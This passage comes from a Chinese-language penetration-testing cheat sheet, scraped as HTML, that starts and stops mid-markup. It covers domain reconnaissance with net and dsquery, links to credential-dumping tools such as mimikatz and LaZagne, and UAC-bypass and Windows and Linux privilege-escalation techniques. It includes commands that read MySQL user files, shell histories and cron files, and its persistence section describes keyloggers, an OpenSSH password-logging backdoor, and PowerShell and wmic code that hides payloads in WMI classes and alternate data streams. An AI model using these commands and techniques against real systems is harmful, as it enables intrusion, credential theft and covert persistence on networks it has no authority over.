tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">busybox httpd -f -p 8000</span></span></code></pre></div><h2 id=\"内网信息搜集\"><a href=\"#内网信息搜集\" class=\"headerlink\" title=\"内网信息搜集\"></a>内网信息搜集</h2><h3 id=\"本机信息搜集\"><a href=\"#本机信息搜集\" class=\"headerlink\" title=\"本机信息搜集\"></a>本机信息搜集</h3><h4 id=\"1、用户列表\"><a href=\"#1、用户列表\" class=\"headerlink\" title=\"1、用户列表\"></a>1、用户列表</h4><p>windows用户列表<br>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 </p>\n<h4 id=\"2、进程列表\"><a href=\"#2、进程列表\" class=\"headerlink\" title=\"2、进程列表\"></a>2、进程列表</h4><p>析杀毒软件&#x2F;安全监控工具等<br>邮件客户端<br>VPN<br>ftp等  </p>\n<h4 id=\"3、服务列表\"><a href=\"#3、服务列表\" class=\"headerlink\" title=\"3、服务列表\"></a>3、服务列表</h4><p>与安全防范工具有关服务[判断是否可以手动开关等]<br>存在问题的服务[权限&#x2F;漏洞]</p>\n<h4 id=\"4、端口列表\"><a href=\"#4、端口列表\" class=\"headerlink\" title=\"4、端口列表\"></a>4、端口列表</h4><p>开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等]<br>利用端口进行信息收集</p>\n<h4 id=\"5、补丁列表\"><a href=\"#5、补丁列表\" class=\"headerlink\" title=\"5、补丁列表\"></a>5、补丁列表</h4><p>分析 Windows 补丁<br>第三方软件[Java&#x2F;Oracle&#x2F;Flash 等]漏洞</p>\n<h4 id=\"6、本机共享\"><a href=\"#6、本机共享\" class=\"headerlink\" title=\"6、本机共享\"></a>6、本机共享</h4><p>本机共享列表&#x2F;访问权限<br>本机访问的域共享&#x2F;访问权限</p>\n<h4 id=\"7、本用户习惯分析\"><a href=\"#7、本用户习惯分析\" class=\"headerlink\" title=\"7、本用户习惯分析\"></a>7、本用户习惯分析</h4><p>历史记录<br>收藏夹<br>文档等 </p>\n<h4 id=\"8、获取当前用户密码工具\"><a href=\"#8、获取当前用户密码工具\" class=\"headerlink\" title=\"8、获取当前用户密码工具\"></a>8、获取当前用户密码工具</h4><h5 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h5><ul>\n<li><a href=\"https://github.com/gentilkiwi/mimikatz\">mimikatz</a>  </li>\n<li><a href=\"https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64\">wce</a>  </li>\n<li><a href=\"https://github.com/peewpw/Invoke-WCMDump\">Invoke-WCMDump  </a></li>\n<li><a href=\"https://github.com/giMini/mimiDbg\">mimiDbg  </a></li>\n<li><a href=\"https://github.com/AlessandroZ/LaZagne\">LaZagne</a></li>\n<li><a href=\"http://launcher.nirsoft.net/downloads/\">nirsoft_package</a></li>\n<li><a href=\"https://github.com/quarkslab/quarkspwdump\">QuarksPwDump</a> <a href=\"https://github.com/mcandre/fgdump\">fgdump</a></li>\n<li>星号查看器等</li>\n</ul>\n<h5 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h5><ul>\n<li><a href=\"https://github.com/AlessandroZ/LaZagne\">LaZagne</a>  </li>\n<li><a href=\"https://github.com/huntergregal/mimipenguin\">mimipenguin</a></li>\n</ul>\n<h5 id=\"浏览器\"><a href=\"#浏览器\" class=\"headerlink\" title=\"浏览器\"></a>浏览器</h5><ul>\n<li><a href=\"https://github.com/moonD4rk/HackBrowserData\">HackBrowserData</a></li>\n<li><a href=\"https://github.com/djhohnstein/SharpWeb\">SharpWeb</a></li>\n<li><a href=\"https://github.com/GhostPack/SharpDPAPI\">SharpDPAPI</a></li>\n<li><a href=\"https://github.com/hayasec/360SafeBrowsergetpass\">360SafeBrowsergetpass</a></li>\n</ul>\n<h5 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h5><ul>\n<li><a href=\"https://github.com/RcoIl/SharpDecryptPwd\">SharpDecryptPwd</a></li>\n<li><a href=\"https://github.com/TideSec/Decrypt_Weblogic_Password\">Decrypt_Weblogic_Password</a></li>\n<li><a href=\"https://github.com/jas502n/OA-Seeyou\">OA-Seeyou</a></li>\n</ul>\n<h3 id=\"扩散信息收集\"><a href=\"#扩散信息收集\" class=\"headerlink\" title=\"扩散信息收集\"></a>扩散信息收集</h3><h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><h5 id=\"常用端口扫描工具\"><a href=\"#常用端口扫描工具\" class=\"headerlink\" title=\"常用端口扫描工具\"></a>常用端口扫描工具</h5><ul>\n<li><a href=\"https://nmap.org/\">nmap</a> </li>\n<li><a href=\"https://github.com/robertdavidgraham/masscan\">masscan</a> </li>\n<li><a href=\"https://github.com/zmap/zmap\">zmap</a></li>\n<li>s扫描器 </li>\n<li>自写脚本等 </li>\n<li>NC </li>\n<li>…</li>\n</ul>\n<h4 id=\"内网拓扑架构分析\"><a href=\"#内网拓扑架构分析\" class=\"headerlink\" title=\"内网拓扑架构分析\"></a>内网拓扑架构分析</h4><ul>\n<li>DMZ</li>\n<li>管理网</li>\n<li>生产网</li>\n<li>测试网</li>\n</ul>\n<h4 id=\"常见信息收集命令\"><a href=\"#常见信息收集命令\" class=\"headerlink\" title=\"常见信息收集命令\"></a>常见信息收集命令</h4><p>ipconfig:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">ipconfig /all ------&gt; 查询本机 IP 段，所在域等</span></span></code></pre></div><p>net:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">net user ------&gt; 本机用户列表</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net user /domain ------&gt; 查询域用户</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net group /domain ------&gt; 查询域里面的工作组</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net localgroup administrators workgroup\\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net view /domain:domainname</span></span></code></pre></div><p>dsquery </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">computers&quot; /domain ------&gt; 列出该域内所有机器名</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dsquery subnet ------&gt;列出该域内网段划分</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dsquery ou ------&gt;列出该域内组织单位 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 </span></span></code></pre></div><h3 id=\"第三方信息收集\"><a href=\"#第三方信息收集\" class=\"headerlink\" title=\"第三方信息收集\"></a>第三方信息收集</h3><ul>\n<li>NETBIOS 信息收集 </li>\n<li>SMB 信息收集  </li>\n<li>空会话信息收集  </li>\n<li>漏洞信息收集等</li>\n</ul>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><h3 id=\"Windows-1\"><a href=\"#Windows-1\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><h4 id=\"BypassUAC\"><a href=\"#BypassUAC\" class=\"headerlink\" title=\"BypassUAC\"></a>BypassUAC</h4><h5 id=\"常用方法\"><a href=\"#常用方法\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h5><ul>\n<li>使用IFileOperation COM接口</li>\n<li>使用Wusa.exe的extract选项</li>\n<li>远程注入SHELLCODE 到傀儡进程</li>\n<li>DLL劫持，劫持系统的DLL文件</li>\n<li>eventvwr.exe and registry hijacking</li>\n<li>sdclt.exe</li>\n<li>SilentCleanup</li>\n<li>wscript.exe</li>\n<li>cmstp.exe</li>\n<li>修改环境变量，劫持高权限.Net程序</li>\n<li>修改注册表HKCU\\Software\\Classes\\CLSID，劫持高权限程序</li>\n<li>直接提权过UAC</li>\n</ul>\n<h5 id=\"常用工具\"><a href=\"#常用工具\" class=\"headerlink\" title=\"常用工具\"></a>常用工具</h5><ul>\n<li><a href=\"https://github.com/hfiref0x/UACME\">UACME </a></li>\n<li><a href=\"https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC\">Bypass-UAC </a></li>\n<li><a href=\"https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko\">Yamabiko </a></li>\n<li>…</li>\n</ul>\n<h4 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h4><ul>\n<li>windows内核漏洞提权</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>检测类:<a href=\"https://github.com/GDSSecurity/Windows-Exploit-Suggester\">Windows-Exploit-Suggester</a>,<a href=\"https://github.com/brianwrf/WinSystemHelper\">WinSystemHelper</a>,<a href=\"https://github.com/bitsadmin/wesng\">wesng</a></p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>利用类:<a href=\"https://github.com/SecWiki/windows-kernel-exploits\">windows-kernel-exploits</a>，<a href=\"https://github.com/AlessandroZ/BeRoot.git\">BeRoot</a></p></blockquote>\n<ul>\n<li>服务提权</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>数据库服务，ftp服务等</p></blockquote>\n<ul>\n<li>WINDOWS错误系统配置 </li>\n<li>系统服务的错误权限配置漏洞 </li>\n<li>不安全的注册表权限配置 </li>\n<li>不安全的文件&#x2F;文件夹权限配置 </li>\n<li>计划任务 </li>\n<li>任意用户以NT AUTHORITY\\SYSTEM权限安装msi </li>\n<li>提权脚本</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1\">PowerUP</a>,<a href=\"https://github.com/rsmudge/ElevateKit\">ElevateKit</a></p></blockquote>\n<h3 id=\"Linux-1\"><a href=\"#Linux-1\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><h4 id=\"内核溢出提权\"><a href=\"#内核溢出提权\" class=\"headerlink\" title=\"内核溢出提权\"></a>内核溢出提权</h4><p><a href=\"https://github.com/SecWiki/linux-kernel-exploits\">linux-kernel-exploits </a></p>\n<h4 id=\"计划任务\"><a href=\"#计划任务\" class=\"headerlink\" title=\"计划任务\"></a>计划任务</h4><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">crontab -l</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ls -alh /var/spool/cron</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ls -al /etc/ | grep cron</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ls -al /etc/cron*</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/cron*</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/at.allow</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/at.deny</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/cron.allow</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/cron.deny</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/crontab</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /etc/anacrontab</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /var/spool/cron/crontabs/root</span></span></code></pre></div><h4 id=\"SUID\"><a href=\"#SUID\" class=\"headerlink\" title=\"SUID\"></a>SUID</h4><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">find / -user root -perm -4000 -print 2&gt;/dev/null</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">find / -perm -u=s -type f 2&gt;/dev/null</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;</span></span></code></pre></div><p>寻找可利用bin：<a href=\"https://gtfobins.github.io/\">https://gtfobins.github.io/</a></p>\n<h4 id=\"系统服务的错误权限配置漏洞\"><a href=\"#系统服务的错误权限配置漏洞\" class=\"headerlink\" title=\"系统服务的错误权限配置漏洞\"></a>系统服务的错误权限配置漏洞</h4><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">cat /var/apache2/config.inc</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /var/lib/mysql/mysql/user.MYD</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat /root/anaconda-ks.cfg</span></span></code></pre></div><h4 id=\"不安全的文件-文件夹权限配置\"><a href=\"#不安全的文件-文件夹权限配置\" class=\"headerlink\" title=\"不安全的文件&#x2F;文件夹权限配置\"></a>不安全的文件&#x2F;文件夹权限配置</h4><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">cat ~/.bash_history</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat ~/.nano_history</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat ~/.atftp_history</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat ~/.mysql_history</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">cat ~/.php_history</span></span></code></pre></div><h4 id=\"找存储的明文用户名，密码\"><a href=\"#找存储的明文用户名，密码\" class=\"headerlink\" title=\"找存储的明文用户名，密码\"></a>找存储的明文用户名，密码</h4><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">grep -i user [filename]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">grep -i pass [filename]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">grep -C 5 &quot;password&quot; [filename]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span></span></code></pre></div><h2 id=\"权限维持\"><a href=\"#权限维持\" class=\"headerlink\" title=\"权限维持\"></a>权限维持</h2><h3 id=\"系统后门\"><a href=\"#系统后门\" class=\"headerlink\" title=\"系统后门\"></a>系统后门</h3><h4 id=\"Windows-2\"><a href=\"#Windows-2\" class=\"headerlink\" title=\"Windows\"></a>Windows</h4><h5 id=\"1、密码记录工具\"><a href=\"#1、密码记录工具\" class=\"headerlink\" title=\"1、密码记录工具\"></a>1、密码记录工具</h5><p>WinlogonHack<br>WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。<br>键盘记录器<br>安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。<br>NTPass<br>获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。<br>Linux 下 openssh 后门<br>重新编译运行的sshd服务，用于记录用户的登陆密码。</p>\n<h5 id=\"2、常用的存储Payload位置\"><a href=\"#2、常用的存储Payload位置\" class=\"headerlink\" title=\"2、常用的存储Payload位置\"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> :<br>存储：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$StaticClass = New-Object Management.ManagementClass(&#39;root\\cimv2&#39;, $null,$null)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$StaticClass.Name = &#39;Win32_Command&#39;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$StaticClass.Put()</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$StaticClass.Put() </span></span></code></pre></div><p>读取:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$Payload=([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value</span></span></code></pre></div><p><strong>包含数字签名的PE文件</strong><br>利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名<br><strong>特殊ADS</strong><br>…</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">type putty.exe &gt; ...:putty.exe</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">wmic process call create c:\\test\\ads\\...:putty.exe</span></span></code></pre></div><p>特殊COM文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">type putty.exe &gt; \\\\.\\C:\\test\\ads\\COM1:putty.exe</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">wmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe</span></span></code></pre></div><p>磁盘根目录</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">type putty.exe &gt;C:\\:putty.exe </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">wmic process call create C:\\:putty.exe</span></span></code></pre></div><h5 id=\"3、Run-RunOnce-Keys\"><a href=\"#3、Run-RunOnce-Keys\" class=\"headerlink\" title=\"3、Run&#x2F;RunOnce Keys\"></a>3、Run&#x2F;RunOnce Keys</h5><p>用户级 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</span></span></code></pre></div><p>管理员 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: 